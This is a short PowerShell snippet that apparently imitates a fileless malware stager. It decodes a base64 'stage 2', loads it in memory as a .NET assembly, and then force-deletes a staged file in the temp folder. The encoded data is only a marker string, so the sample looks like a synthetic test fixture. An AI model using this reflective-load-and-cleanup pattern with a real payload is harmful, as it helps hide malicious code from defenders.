
$StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp1MTk3em5mYjhn"); $FetchResult = [Reflection.Assembly]::Load($StageBytes); $FetchResult.GetTypes().Count; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
